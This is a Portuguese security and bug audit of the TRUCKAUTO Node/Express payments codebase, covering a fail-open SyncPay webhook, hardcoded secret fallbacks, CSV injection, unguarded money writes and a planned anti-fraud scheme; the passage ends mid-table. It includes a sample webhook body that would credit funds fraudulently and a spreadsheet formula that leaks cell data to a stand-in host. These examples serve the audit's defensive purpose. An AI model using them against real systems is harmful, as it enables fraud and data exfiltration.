---
last_mapped_commit: 3b38fa8
mapped_date: 2026-09-30
project: TRUCKAUTO / ProjetoEscola
document: CONCERNS
refresh_of: 4c16c6f
---

# Codebase Concerns

**Analysis Date:** 2026-09-30
**Mapped Commit:** `3b38fa8` (refresh; previous map written at `4c16c6f`, 2026-09-29)
**Projeto:** TRUCKAUTO / ProjetoEscola (monolito Node/Express + Postgres OU `data.json` + CRM React separado)
**Escopo:** riscos (seguranca, integridade financeira, resiliencia), bugs confirmados, divida tecnica e areas frageis. Auditoria **read-only** sobre o codigo - nenhum arquivo do produto foi alterado.

**Nenhum valor de segredo aparece neste documento.** Credenciais sao referenciadas apenas pelo nome da variavel de ambiente / chave.

## Delta desde o mapa anterior (2026-09-29 -> 2026-09-30)

O pull trouxe 19 arquivos / +578 linhas. Os que alteram o perfil de risco:

| Arquivo | Mudanca | Impacto no risco |
|---|---|---|
| `services/crmSession.js` | **NOVO** (61 linhas) | fecha o CRM que estava aberto; introduz cookie httpOnly assinado e um middleware global no router do CRM |
| `routes/crm.js` | +58 linhas | middleware de sessao + mascaramento de `/settings`; **duas rotas ficaram inacessiveis** (ver BUG-01/BUG-02) |
| `database.js` | +87 linhas | colunas `register_ip_hash` / contagem por IP; nada mudou em `cpf_cnpj` |
| `public/app.js` | +181 linhas | gancho de sessao e contador de check-in; nada critico |
| `routes/fleet.js` | +59 linhas | logica de carencia de 30 dias por modelo |
| `routes/wallet.js` | +47 linhas | limites Fase 2 (janela rolante) no saque |

Base de evidencia desta rodada: `git log --oneline` (HEAD = `3b38fa8`), leitura integral de `database.js`, `server.js`, `routes/{auth,wallet,admin,crm,fleet,team,support}.js`, `middleware/auth.js`, `services/{crmSession,crmDb,misticpay,careerEngine,settlementEngine,limits,backup,keepAliveWatchdog,aiSdrEngine,asaas,syncpay,cartpanda}.js` e `plano-antifraude-bonus-R5.md`.

---

## 0. Plano Anti-Fraude - `plano-antifraude-bonus-R5.md` (PLANEJADO, nao implementado)

Documento na raiz do repo, datado 2026-09-29, status **"PLANEJADO - nao implementar ainda"**. Problema declarado: mesma pessoa criando ~20 contas mudando o final do telefone para farmar o bonus de boas-vindas de R$ 5 por conta.

### Verificacao item a item contra o codigo atual

| # | Item planejado | Status em 2026-09-30 | Evidencia (file:line) |
|---|---|---|---|
| 1 | CPF/CNPJ obrigatorio e unico no `POST /api/auth/register`, com mod-11 | **AUSENTE** | `routes/auth.js:12` desestrutura apenas `phone, password, inviteCode, utm*, fbclid, ttp`. Nao ha campo `cpfCnpj` no cadastro, nem `findUserByCpf` em `database.js` (grep por `findUserByCpf` = 0 hits). A unica validacao de CPF que existe no repo e `isValidCpf` em `services/misticpay.js:93-106`, usada apenas na **chave Pix de saque** e como exigencia do gateway no deposito |
| 2 | `UNIQUE (cpf_cnpj)` + `register_ip_hash` + `device_hash` no Postgres | **PARCIAL** | `database.js:250` cria `cpf_cnpj VARCHAR(20)` **sem UNIQUE**; `database.js:383` e um `ALTER TABLE ... ADD COLUMN IF NOT EXISTS cpf_cnpj VARCHAR(20)` tambem sem constraint. `register_ip_hash` **existe**: `database.js:385` (coluna) + `database.js:703` (gravada em `createUser`) + `database.js:858-880` (`countUsersByIpSince`). `device_hash` **nao existe** - grep = 0 hits em todo o repo. `routes/auth.js:61-67` calcula o hash de IP, mas nao ha hash de user-agent |
| 3 | CPF do deposito = CPF do cadastro | **AUSENTE e PIOR QUE O PLANO DIZ** | `routes/wallet.js:123-129`: se `cleanDoc && cleanDoc !== user.cpfCnpj` -> `updateUser(user.id, { cpfCnpj: cleanDoc })`. Sobrescreve em silencio, exatamente como o plano descreve (o plano citava `108-110`; hoje e `123-129`). Sem `403`, sem trava de "salva uma vez". Alem disso `routes/wallet.js:124` so exige CPF **se a Asaas estiver habilitada** |
| 4 | Chave Pix amarrada a conta (1 chave = 1 conta) | **AUSENTE** | `routes/wallet.js:660-675` valida **formato** via `validatePixKey` (`services/misticpay.js:124-168`). Nao existe nenhuma consulta a `transactions` para detectar a mesma `pix_key` em outro `user_id`. O planocitava `635-726`; hoje e `654-849` |
| 5 | `registerLimiter` 60/h -> 10/h + `register_ip_hash` + `device_hash` + `crmStatus='suspeito'` | **PARCIAL** | `registerLimiter` **continua 60/h** em `server.js:62-69` (o plano pedia 10/h). `register_ip_hash` foi implementado (`routes/auth.js:61-67`). O soft-flag `crmStatus='suspeito'` foi implementado em `routes/auth.js:90-106` (>= 4 contas/24h no mesmo hash de IP) com alerta no Telegram. `device_hash` continua ausente |
| 6 | Limpeza de duplicatas ANTES de ligar o UNIQUE | **NAO INICIADA** (correto - depende de 1, 3 e 4) | Nenhum script/migration de limpeza no repo. `getAllUsers()` + filtro em JS e o caminho usado ad-hoc pelos webhooks (`routes/wallet.js:531-532`, `:606-607`) |

### Restricao de ordenacao (critica, e o plano esta certo)

O plano e explicito em `plano-antifraude-bonus-R5.md:59-62`:

1. **Item 6 (limpeza) tem de rodar ANTES do item 2 (UNIQUE).** Se o `UNIQUE (cpf_cnpj)` for ligado antes da limpeza, o primeiro `INSERT` de um CPF ja duplicado vai estourar `23505` e derrubar o cadastro de um usuario legitimo. Alem disso, na versao atual **existe** duplicata (item 1 nunca foi implementado, entao nada impede N contas com o mesmo CPF).
2. O item 2 tambem exige o item 1 antes dele - sem CPF obrigatorio no cadastro, `cpf_cnpj` continua majoritariamente NULL e o `UNIQUE` nao protege nada (Postgres permite N NULLs em coluna UNIQUE).
3. O item 3 depende do item 1 (sem CPF no cadastro, "CPF do cadastro" nao existe).
4. O item 6 precisa de um criterio de desempate definido antes de rodar (o plano sugere "mantem a mais antiga com deposito, demais vão para suspeito/ban + estorno do bonus `BNS-SIGNUP-*`") - o estorno depende do filtro por prefixo de id que hoje existe em `routes/wallet.js:690` (`String(t.id || '').indexOf('BNS-SIGNUP') === 0`).

### Observacoes adicionais do plano que a codigo atual confirma ou desmente

- `plano-antifraude-bonus-R5.md:10` cita "match fraco por sufixo em `database.js:553-562`". **Confirmado e deslocado**: hoje o match por sufixo esta em `database.js:627-637` (Postgres, `RIGHT(REGEXP_REPLACE(phone,...), 8) = $1`) e `database.js:647-651` (modo JSON, `.endsWith(suffix)`). Um `findUserByPhone` que bate nos **ultimos 8 digitos** significa que `1198765-4321` e `1199999-4321` sao tratados como o mesmo telefone no login - isso **mascara** o proprio bug de farm, porque o agricultor muda o final para *tentar* criar conta nova e o sistema barra.
- `plano-antifraude-bonus-R5.md:50` pede trocar a trava de "1 saque por dia corrido" por contador rolante de 24h. **JA RESOLVIDO, por outro caminho**: `services/limits.js:108-111` usa `msUntilNextWithdraw(lastWithdrawAt, now, DAY)` e `routes/wallet.js:730` deriva `lastWithdrawAt` do `createdAt` da transacao mais recente. Nao ha `last_withdraw_at` gravado na tabela, mas o comportamento pedido existe. O item da Fase 2 em `plano-limites-nativos-fase2.md` esta implementado e aprovado.
- `plano-antifraude-bonus-R5.md:73` - a Fase 2 foi movida para `plano-limites-nativos-fase2.md` e esta **implementada**. Verifiquei os 9 campos: `services/limits.js:7-17`, `database.js:1968-1977`, `routes/wallet.js:110-122` (depósito) e `routes/wallet.js:723-758` (saque), `routes/fleet.js:177-191` (comissão só sobre dinheiro real).

**Conclusao:** o plano antifraude segue majoritariamente **nao implementado**. O que existe (hash de IP + soft-flag de suspeita + expiração do bonus em 7 dias + limites rolantes) e a Fase 2, que e outra coisa. O farm de ~20 contas por bonus de R$ 5 continua **totalmente possivel**: telefone novo com sufixo diferente passa em `routes/auth.js:36-43` e o bonus cai em `routes/auth.js:108-126`.

---
## Security

### SEC-01 - Webhook SyncPay e fail-OPEN: sem token configurado = endpoint publico que credita saldo (CRITICO)
- Issue: `routes/wallet.js:560-566` so verifica `SYNCPAY_WEBHOOK_TOKEN` **se a variavel existir** (`if (SYNCPAY_WEBHOOK_TOKEN) { ...verifica... }`). Sem token, nao ha nenhuma checagem. O restante do handler credita saldo em `routes/wallet.js:636`.
- Why: padrao copiado do gateway opcional; `.env.example:53` e `render.yaml:49` marcam `SYNCPAY_WEBHOOK_TOKEN` como opcional.
- Impact: com `SYNCPAY_WEBHOOK_TOKEN` ausente e `SYNCPAY_CLIENT_ID`/`SYNCPAY_CLIENT_SECRET` presentes, qualquer POST anonimo em `/api/wallet/webhook/syncpay` com `{status:'completed', amount:5000, data:{client:{document:'<CPF>'}}}` credita R$ 5.000. O casamento de usuario e por CPF (`:603-609`), por e-mail (`:612-617`) ou **por nome** (`:619-624`) - os tres sao adivinhaveis. A unica protecao e a idempotencia por `SYNC-${txIdentifier}` (`:631-635`), que o atacante contorna so usando identificadores diferentes.
- Contraste: os outros tres webhooks sao fail-closed ou verificados. `routes/wallet.js:186` (Cartpanda) rejeita se `CARTPANDA_WEBHOOK_SECRET` nao estiver setado. `routes/wallet.js:398` (Asaas) rejeita se `ASAAS_WEBHOOK_TOKEN` nao estiver setado. `routes/wallet.js:507-520` (MisticPay) nao usa token, mas confirma server-side via `checkTransactionPaid` e usa o valor **da API**, nunca do corpo.
- Fix approach: inverter a condicao - `if (!SYNCPAY_WEBHOOK_TOKEN || got !== SYNCPAY_WEBHOOK_TOKEN) return 401`, igual a Cartpanda/Asaas. Adicionar um alerta de Telegram quando o webhook chegar sem token configurado.

### SEC-02 - Auto-criacao de usuario no webhook Cartpanda grava senha em texto puro e usa `passwordHash` inexistente
- Issue: `routes/wallet.js:266-285` cria o usuario com `{ id, operatorName, phone, password: '123', ... }`. O campo esperado por `database.js:684-705` e `passwordHash` (bcrypt).
- Impact (dois broken paths, nenhum bom): em Postgres, `password_hash TEXT NOT NULL` (`database.js:251`) viola o `NOT NULL` -> `INSERT` falha e o handler responde 500 **depois de o gateway ja ter cobrado**. Em modo `data.json`, o usuario e criado com `password` (texto puro) e sem `passwordHash`; `routes/auth.js:231` faz `bcrypt.compareSync(password, user.passwordHash)` com `undefined` -> lanca/retorna falso, entao **a conta nunca consegue logar**. E a senha em texto puro fica persistida no arquivo.
- Fix approach: `bcrypt.hashSync(gerarSenhaAleatoria(), 10)` + `passwordHash`, e devolver a senha por um canal seguro (ou exigir loginagic link). Nunca `password:`.

### SEC-03 - ID de usuario com 9.000 possibilidades no auto-create
- Issue: `routes/wallet.js:269` - `const newUserId = 'usr_' + Math.floor(1000 + Math.random() * 9000)`.
- Impact: apenas 9.000 IDs possiveis, todos seguem o formato de `newUserId()` (`database.js:668`, `usr_` + 16 hex). Com a PRIMARY KEY em `database.js:247`, colisao e `INSERT` rejeitado - real conforme o volume cresce. Alem disso o ID e adivinhavel.
- Fix approach: usar `newUserId()` de `database.js:667-669`.

### SEC-04 - Segredos com fallback embutido no codigo-fonte
- Issue (3 locais, todos com guarda de producao, todos com literal no source):
  - `middleware/auth.js:4` - `JWT_SECRET` cai num literal de desenvolvimento; `middleware/auth.js:7-9` lanca se `NODE_ENV=production` e a variavel faltar.
  - `routes/admin.js:62` - `ADMIN_KEY` cai num literal de desenvolvimento; `routes/admin.js:65-67` lanca em producao.
  - `routes/crm.js:116` - `EVOLUTION_INSTANCE_TOKEN` cai num literal fixo ao criar instancia. **Sem guarda de producao.**
- Impact: se `NODE_ENV` nao for `production` no deploy (Render define em `render.yaml:12-13`, mas qualquer outro host - ou um `npm start` local com porta exposta - nao), o painel admin, o login e **todos os tokens JWT do app** ficam assinados com um valor conhecido do repositorio. `routes/crm.js:116` e o pior dos tres porque nao tem guarda nenhuma.
- Fix approach: fallback = `throw` incondicional (nao so em producao) para `JWT_SECRET`/`ADMIN_KEY`; `EVOLUTION_INSTANCE_TOKEN` deve ser obrigatorio.

### SEC-05 - `crmSession.secret()` reusa a senha do admin como chave de assinatura
- Issue: `services/crmSession.js:13-15` - `secret()` = `CRM_SECRET || ADMIN_KEY || ADMIN_PASSWORD`. O mesmo valor que abre `/admin` assina o cookie do CRM.
- Impact: quem tem a senha do admin ja pode forjar um cookie de sessao do CRM sem passar por `routes/auth.js:212-225`. Nao e escalada de privilegio (admin ja e admin), mas **um vazamento da senha do admin vaza duas superficies** e a rotacao da senha do admin invalida sessoes do CRM sem aviso.
- Fix approach: exigir `CRM_SECRET` dedicado e falhar alto se ausente, como ja e feito em `routes/crm.js:16-18`.

### SEC-06 - Sessao do CRM nao e revogavel e o logout do front nao encerra a sessao
- Issue: o cookie `truckauto_crm_session` (`services/crmSession.js:10`, TTL 12h em `:11`) e um token auto-contido assinado com HMAC. Nao existe store, nem lista de revogacao, nem `jti`. O bundle do CRM faz logout so apagando `truckauto_crm_token` do `localStorage` (nao ha chamada de logoff em `routes/crm.js`).
- Impact: clicar "Sair do Painel" remove a flag local, mas o cookie httpOnly continua valido por ate 12h. Logout enganoso. Se a senha do admin mudar, `secret()` muda e as sessoes caem - o unico "logout global" que existe.
- Fix approach: rota `POST /api/auth/logout` que chame `clearCookie` (`services/crmSession.js:51-53`, hoje **exportada e nunca usada**) e usar no bundle.

### SEC-07 - Comparacoes de segredo nao constant-time (risco teorico, relevante por serem credencial de alto valor)
- Issue: `routes/admin.js:91` (`key.trim() === ADMIN_KEY`), `routes/admin.js:114` (`key === ADMIN_KEY`), `routes/crm.js:24` (`s === CRM_KEY`), `routes/auth.js:214` (`password === correctPass`).
- Why: o projeto **ja tem** a primitiva correta e a usa em `services/crmSession.js:36-39` (`timingSafeEqual` + comparacao de tamanho antes).
- Impact: exposicao teorica de temporizacao. Baixa probabilidade, alto impacto (ADMIN_KEY da acesso a dinheiro).
- Fix approach: extrair um `safeEqual(a, b)` e usar nos 4 pontos.

### SEC-08 - CSV do CRM sem escape de formula (CSV injection)
- Issue: `routes/crm.js:468-469`, `:481-492` e `:503-513` montam CSV a partir de dados do usuario (nome, telefone, nome de campanha) sem neutralizar prefixos `=`, `+`, `-`, `@`, `\t`, `\r`.
- Impact: um lead com `name` = `=HYPERLINK("http://x/?d="&A1,"clique")` exportado e aberto no Excel/Google Sheets executa. `routes/crm.js:503-522` (`/leads/export/lookalike`) ainda exporta **telefone de todo lead** para upload em plataforma de anuncios.
- Fix approach: prefixar celula que comeca com caractere perigoso com `'`, e restringir `export/lookalike` a quem tem permissao administrativa explicita.

### SEC-09 - `PUT /leads/:id` e mass assignment irrestrito
- Issue: `routes/crm.js:402-407` passa `req.body` direto para `db.updateLead`, que faz `Object.assign(lead, updates)` (`services/crmDb.js:160`). `routes/crm.js:397-401` faz o mesmo no create (`req.body` -> `createLead`).
- Impact: quem tem sessao de CRM reescreve qualquer campo do lead, inclusive `phone` (que e a chave de identidade em `services/crmDb.js:88`, `:96`), `stage`, `botPaused`, `unreadCount`. Nao ha allowlist de campos.
- Fix approach: allowlist explicita dos campos editaveis no router.

### SEC-10 - Exposicao de dados pessoais para terceiro (Telegram) e para planilha
- Issue: `services/backup.js:69-86` envia diaria um CSV com nome, telefone, saldo, total depositado, total sacado de **todos** os usuarios para um chat do Telegram (`render.yaml:26-30`). Alem disso `routes/admin.js` tem rota de export CSV de usuarios (`routes/admin.js:~1278`).
- Impact: dado pessoal e financeiro sai do ambiente controlado para um canal de terceiros, sem cifragem, sem prazo de retencao, sem registro de quem baixou. LGPD: base legal e minimizacao nao documentados.
- Fix approach: restringir o backup a agregados ou enviar para storage com controle de acesso; registrar acesso.

### SEC-11 - `helmet` sem CSP
- Issue: `server.js:32` - `helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false })`.
- Why: comentario diz que CSP quebraria scripts e fontes inline.
- Impact: nao existe mitigacao alguma para XSS reflexivo/DOM-based no admin (`public/admin.html`, ~1500 linhas de `<script>` inline) nem no app do operador. Como nao existe `escapeHtml` no `public/admin.html` (o `public/app.js:1352` define um, o admin nao), qualquer campo interpolado sem escape no admin e um XSS com acesso a sessao de admin - que e chave de dinheiro.
- Fix approach: CSP com nonce para os scripts inline, ou migrar o admin para arquivos com build (o `public/admin-filters.js` ja prova que o padrao funciona).

### SEC-12 - Ausencia de rate limit em endpoints de dinheiro
- Issue: `server.js:37-58` protege `login` e `admin/auth/verify`. `routes/wallet.js:654` (`/withdraw`), `routes/wallet.js:852` (`/checkin`), `routes/wallet.js:898` (`/bonus/redeem`) e `routes/fleet.js:80` (`/hire`) **nao tem rate limit proprio** - apenas `authMiddleware`.
- Impact: com um token valido, um operador pode disparar dezenas de `/checkin` por segundo. O `lastCheckinDate` (`:857`) protege o bonus diario em teoria, mas `toDateString()` (`:855`) usa o fuso **do servidor**, e em Postgres `last_checkin_date` e `VARCHAR(32)` (`database.js:260`) gravado sem timezone. Multiplas instancias (ou um bypass) multiplicam o ganho.
- Fix approach: rate limit por usuario nas rotas de credito, e `CHECK` no banco para o bonus diario.

### SEC-13 - `GET` altera estado (CRM)
- Issue: `routes/crm.js:422-427` - `router.get('/messages/:leadId')` chama `db.updateLead(..., { unreadCount: 0 })`, que escreve em disco (`services/crmDb.js:160-161`).
- Impact: estado alterado por GET quebra cache e permite CSRF por navegacao (o cookie e `sameSite: 'lax'`, que envia em GET de topo).
- Fix approach: mover para `POST /messages/:id/read`.

### SEC-14 - Webhook Evolution sem assinatura e agora inalcancavel (ver BUG-01)
- Issue: `routes/crm.js:231` aceita o POST sem validar assinatura nenhuma. O unico motivo de nao ser um vazamento aberto e a sessao - que tambem o torna inutilizavel (BUG-01).
- Fix approach: aceitar, no lugar do cookie, um header secreto configuravel na Evolution API (mesmo padrao de `leadIngestAuth`, `routes/crm.js:22-26`).

---
## Secrets e credenciais no repositorio

**Verificado: nenhum segredo real esta versionado.** `git ls-files` mostra apenas `.env.example` entre os arquivos de ambiente/config; `data.json` e `crm_data.json` estao no `.gitignore:5-6`; `.env` e `.env.local` no `.gitignore:11-12`. `.env.example` contem apenas placeholders. `render.yaml:19-56` usa `sync: false` para todos os segredos (a Render exige que sejam preenchidos no painel). `data.json` local tem 0 usuarios.

### O que precisa ser dito sobre `database.js:1961-2018`

A investigacao foi feita e **o alerta nao se confirma**: `getSystemSettings()` (`database.js:1956-2035`) tem um bloco `defaultSettings` (`:1957-1978`) que contem **apenas preferences e limites de negocio** - `nexusCrmUrl`, `whatsappNumber`, `metaPixelId`, `tiktokPixelId`, `gatewayOrder`, `gatewayDisabled`, `minDeposit`, `minWithdraw`, `withdrawFee`, `signupBonus` e os 9 campos da Fase 2. **Nenhuma credencial de gateway esta ali.** As chaves de gateway (`MISTIC_PK`, `MISTIC_SK`, `ASAAS_API_KEY`, `SYNCPAY_CLIENT_ID`, `SYNCPAY_CLIENT_SECRET`, `CARTPANDA_API_TOKEN`, `ASAAS_WEBHOOK_TOKEN`, `SYNCPAY_WEBHOOK_TOKEN`, `CARTPANDA_WEBHOOK_SECRET`) sao lidas **exclusivamente de `process.env`** em `services/misticpay.js:6-7`, `services/asaas.js:6-11`, `services/syncpay.js:6-7`, `services/cartpanda.js:3` e `routes/wallet.js:175`. O commit anterior nao introduziu segredo no `defaultSettings`.

### Onde o risco de segredo realmente esta

1. **Fallbacks no source** - SEC-04 (`middleware/auth.js:4`, `routes/admin.js:62`, `routes/crm.js:116`).
2. **`services/crmDb.js:7-18`** - `INITIAL_DATA.settings` declara `globalApiKey`, `webhookToken` e `adminPassword` como campos de settings do CRM, persistidos em `crm_data.json` (fora do git, correto). O risco aqui e de leitura/escrita, nao de commit: `services/crmDb.js:454` (`getSettings`) devolve o objeto **cru**, e `routes/crm.js:445-453` (`safeSettings`) e a unica barreira - ela mascara `globalApiKey` e `webhookToken` e zera `adminPassword`, mas **nao mascara `evolutionApiUrl`** e nao tem teste. Qualquer rota nova que use `db.getSettings()` direto vaza chave.
3. **Envio de dados para terceiro** - SEC-10 (Telegram).
4. **Token de bot do Telegram na URL** - `services/telegramBot.js:241,252,261,278,446,519,565,608,648` montam `https://api.telegram.org/bot<TOKEN>/sendMessage`. O token viaja na URL; qualquer log de erro que inclua a URL (ou um proxy com log de requisicao) expoe o bot.
5. **Linha de execucao com segredo em URL** - `routes/crm.js:95` devolve `error: ... em <EVOLUTION_API_URL>` na resposta HTTP ao cliente. A URL base pode conter token em query string, dependendo de como o Evolution foi provisionado.

**Fix approach:** mover `safeSettings` para dentro de `crmDb.js` (para que o bruto nao escape do modulo), adicionar teste de nao-vazamento, e normalizar os env vars em um unico `services/secrets.js` com validacao de presenca no boot (fail-fast) em vez de `|| ''`.

---

## Bugs confirmados

### BUG-01 - Webhook do Evolution API e Meta verification estao inalcancaveis: a sessao nova os bloqueia
Este e o bug mais grave introduzido pelo pull.

- Issue: `routes/crm.js:33-36` aplica `crmSession.middleware` a **tudo** que nao for `POST /leads/webhook`. Isso inclui o webhook do Evolution (`:231`) e o handshake GET de verificacao do Meta (`:336`). Ambos sao chamados por **servicos externos**, que nao tem cookie de sessao de navegador.
- Why: a exclusao em `:34` testa `req.method === 'POST' && req.path === '/leads/webhook'`. O `GET /leads/webhook` (Meta verification) cai direto no `crmSession.middleware` e recebe `401`.
- Impact: (a) toda mensagem de WhatsApp recebida pela Evolution API retorna `401` e o fluxo do SDR (`routes/crm.js:294-320`) nunca roda - o bot fica mudo; (b) o Meta nao consegue validar o webhook de leads, entao nenhum lead entra pelo caminho oficial. Vale confirmar em producao pelo log `[WEBHOOK EVOLUTION RECEIVED]` (`routes/crm.js:236`), que nunca deve aparecer.
- Fix approach: inverter a logica - lista de allow de rotas publicas (`POST /webhook/evolution`, `GET|POST /leads/webhook`) em vez de lista de excecao de uma rota.

### BUG-02 - `GET /leads/export` esta sombreado por `GET /leads/:id`
- Issue: `routes/crm.js:465-474` registra `/leads/export`; `routes/crm.js:392` registra `/leads/:id` **antes**. O primeiro `:id` casa com a string `export`.
- Impact: `GET /api/leads/export` devolve `404 { error: 'Lead não encontrado' }`. Rota morta. (A variante `/leads/export/csv`, em `:478`, nao e sombreada e funciona.)

### BUG-03 - Backup diario sempre reporta 0 transacoes (bug de `require`)
- Issue: `services/backup.js:48` - `const { getAllTransactions } = require('./database')`. O caminho esta errado (`database.js` esta um nivel acima).
- Impact: o `require` lanca, o `catch` em `:51` engole e `txCount` fica `0` para sempre. A legenda do Telegram (`services/backup.js:78`) diz "0 transacoes" todos os dias, dando falsa seguranca de que o backup e completo. **O backup em si continua sendo gerado** (o CSV de usuarios e contratos vem de `getAllUsers`/`getContractsByUserId`, linhas 13-45, com caminho correto) - o que mente e so a metrica.
- Fix approach: `require('../database')`. Adicionar teste que falhe se `txCount` for 0 com base nao vazia.

### BUG-04 - Auto-create do Cartpanda cria usuario sem `passwordHash` (ver SEC-02)
Ja detalhado em SEC-02. Sintese do impacto: em Postgres o INSERT viola `NOT NULL` e responde 500 **depois da cobranca**; em `data.json` cria conta inutilizavel com senha em texto puro.

### BUG-05 - `routes/team.js:30-34` quebra se alguma transacao de comissao tiver `description` nulo
- Issue: `myCommissions.filter(t => t.description.includes('Nivel 1'))` - sem guarda para `null`/`undefined`.
- Impact: `TypeError` -> 500 em `GET /api/team/overview`, que e a tela principal de Rede do operador. `database.js:299` permite `description TEXT` nulo; `careerEngine.js:253` sempre preenche, mas `routes/admin.js` cria comissoes manuais e nao ha constraint.
- Fix approach: `(t.description || '')`.

### BUG-06 - `keepAliveWatchdog` engole `uncaughtException` e `unhandledRejection`
- Issue: `services/keepAliveWatchdog.js:32-38`.
- Impact: o processo continua vivo em estado indefinido depois de um erro fatal. Um `RangeError: Maximum call stack size exceeded` ou um erro de escrita em Postgres deixa o servidor "up" (o `/api/health` continua 200, `server.js:166-168`) enquanto Money esta errado. E o oposto de um watchdog: mascara em vez de recuperar.
- Fix approach: logar em arquivo/alerta Telegram e `process.exit(1)` para o Render reiniciar. Se o objetivo era apenas "nao cair", entao o nome do arquivo esta errado.

### BUG-07 - `writeDb` engole falha de escrita do CRM
- Issue: `services/crmDb.js:61-67` - o `catch` de `fs.writeFileSync` so faz `console.error`.
- Impact: `crmDb.createLead` / `updateLead` retornam sucesso ao caller mesmo quando nada foi persistido - lead, mensagem ou atualizacao de stage "some" sem erro visivel.
- Fix approach: propagar o erro.

### BUG-08 - Leitura corrompida do `crm_data.json` reseta o CRM inteiro para vazio
- Issue: `services/crmDb.js:47-59` - no `catch` de `JSON.parse`, `readDb()` devolve `INITIAL_DATA`.
- Impact: um arquivo truncado (queda no meio de um `writeFileSync`, sem tmp+rename) apaga **todo** o funil na proxima leitura - e o proximo `writeDb` grava essa versao vazia por cima. Perda total e definitiva.
- Fix approach: `try { JSON.parse } catch { throw }` e manter um `.bak` rotativo; escrever em `.tmp` + `rename`.

### BUG-09 - Id de transacao por `Date.now()` no webhook Cartpanda quebra a idempotencia
- Issue: `routes/wallet.js:304` - `` const txId = `CP-${rawBody.id || (rawBody.order && rawBody.order.id) || Date.now()}` ``.
- Impact: se o gateway chamar o webhook sem `id`, cada chamada gera um id novo, a checagem de idempotencia em `:308-311` passa sempre, e o mesmo pagamento credita N vezes. So nao e exploravel hoje porque `CARTPANDA_WEBHOOK_SECRET` e fail-closed (`:186`) - mas e um landmine quando a autenticacao mudar.
- Fix approach: exigir `id`; sem ele, logar em `webhook_logs` como `user_not_found` e nao creditar.

### BUG-10 - `catch` vazio em paths de dinheiro
- Issue (varios): `routes/wallet.js:484` (falha ao marcar Pix usado apos liquidar saque), `routes/wallet.js:587` (falha ao buscar display no log de webhook), `routes/admin.js:359` (falha ao reverter saque para `pending`), `routes/auth.js:56` (falha ao buscar a casa padrao de indicação), `routes/support.js:76`.
- Impact: `routes/admin.js:359` e o caso serio - se o `updateTransaction` falhar, o saque fica em `processing` para sempre e o `payoutSent` ja era `true`, entao o admin recebe um 500 sem saber se o Pix saiu. E exatamente o cenario que `routes/admin.js:366-391` (`manual-paid`) existe para cobrir manualmente - ou seja, a operacao depende de alguem olhar.
- Fix approach: no minimo `console.error` com contexto; nos paths de dinheiro, alerta no Telegram.

### BUG-11 - Saldo local mutado e nunca persistido em `settlementEngine`
- Issue: `services/settlementEngine.js:166` - `user.balance = Math.round((parseFloat(user.balance || 0) + v) * 100) / 100;` dentro do loop de fatias.
- Impact: codigo morto que sugere que existe um cache local de saldo. Quem le `services/settlementEngine.js:155-167` acha que `user` e persistido; nao e. Como as escritas usam `earnBalanceInc`/`balanceInc` (`:127`), o resultado esta certo - o codigo e que esta enganoso.
- Fix approach: remover a linha.

### BUG-12 - `processDailySettlement` existe, credita o dia inteiro, e nao e chamado
- Issue: `services/settlementEngine.js:14-66` credita `contract.dailyReturn` **uma vez por dia inteiro**, decrementa `daysRemaining` e grava transacao `Rendimento Diário`.
- Impact: hoje e codigo morto (grep: nenhum caller). Mas e exportado (`:70`) e qualquer futuro caller passara a creditar o dia completo **em cima** do gotejamento por hora - o comentario em `:5` ("motor de liquidacao diaria") sugere que e o caminho antigo. Se alguem religar, dobra o rendimento do dia.
- Fix approach: remover, ou marcar com `@deprecated` e testar contra `runSlices`.

### BUG-13 - `routes/fleet.js:58` expoe catalogo sem autenticacao
- Issue: `GET /api/fleet/products` nao tem `authMiddleware` (compare `routes/fleet.js:69`, que tem).
- Impact: baixo - e o catalogo publico. Mas e a unica rota de `fleet.js` assim, e inconsistente com o resto do arquivo. Vale confirmar se e intencional.

---
## Money arithmetic - `balance` derivado, races e atomicidade

### O modelo de dado

`users` tem **tres** colunas de dinheiro redundantes (`database.js:254-256`, e o DDL de `data.json` espelha isso):
- `balance` - campo denormalizado, definido como `invest_balance + earn_balance`
- `invest_balance` - dinheiro do deposito, so sai comprando frota (`routes/fleet.js:141-146`)
- `earn_balance` - dinheiro de rendimento/comissao/bonus, de onde sai o saque (`routes/wallet.js:761-764`)

O padrao de escrita em toda a codebase e derivar `balance` explicitamente a partir de uma leitura possivelmente obsoleta de `investBalance`/`earnBalance`:

```
balance: Math.round(((user.investBalance || 0) + newEarn) * 100) / 100
```

### O que NAO e transacional

Verificado por leitura integral de `database.js`: **nao existe uma unica transacao no arquivo.** Zero ocorrencias de `BEGIN`, `COMMIT` ou `ROLLBACK`. Cada `pool.query` e autocommit. Isso significa que nao existe atomicidade multi-statement em nenhum fluxo - e todo fluxo que faz 2+ escritas (debitar saldo + criar transacao) e vulneravel a estado parcial se o processo morrer no meio.

Exemplos de fluxos de 2+ escritas sem transacao:
- `routes/wallet.js:780-784` (debate `earnBalance` + `totalWithdrawn`) seguido de `routes/wallet.js:795-805` (`createTransaction` do saque). Se o processo morrer entre os dois: saldo debitado, **nenhum registro de saque** - o dinheiro some sem rastro.
- `routes/fleet.js:146` (debate) seguido de `:162` (`createContract`) e `:165-173` (`createTransaction`). Morte no meio: saldo debitado, nenhuma frota criada.
- `routes/wallet.js:869-873` (credito do check-in) seguido de `:875-883` (transacao). Morte no meio: bonus creditado sem comprovante no extrato.
- `services/careerEngine.js:202-217` (bonus de graduacao) - credita e depois grava a transacao.
- `routes/admin.js:412-416` (estorno do saque rejeitado) - credita saldo e mexe `totalWithdrawn` no mesmo `updateUser`, mas a gravacao da transacao (`routes/admin.js:404-407`) ja aconteceu antes; se o `updateUser` falhar, o saque fica `rejected` e o usuario **nao recebe o estorno**.

### Onde existe atomicidade real (Postgres)

`database.js:787-807` implementa incrementos no proprio SQL (`balance = COALESCE(balance, 0) + $n`). Usado corretamente em:
- credito de deposito: `routes/wallet.js:314-318` (Cartpanda), `:431` (Asaas), `:542` (MisticPay), `:636` (SyncPay)
- rendimento por gotejamento: `services/settlementEngine.js:127`
- comissao: `services/careerEngine.js:245`
- bonus de graduacao: `services/careerEngine.js:202-207`
- estorno de saque rejeitado: `routes/admin.js:412-414`

O comentario em `database.js:787` ("incrementos atomicos (evitam perda em creditos concorrentes)") esta correto e esses paths estao protegidos.

### Onde NAO existe atomicidade (read-modify-write) - os bugs

O anti-padrao e: `findUserById` -> calcular valor absoluto -> `updateUser` com valor absoluto. Ha pelo menos **seis** ocorrencias:

| Local | Codigo | Consequencia sob concorrencia |
|---|---|---|
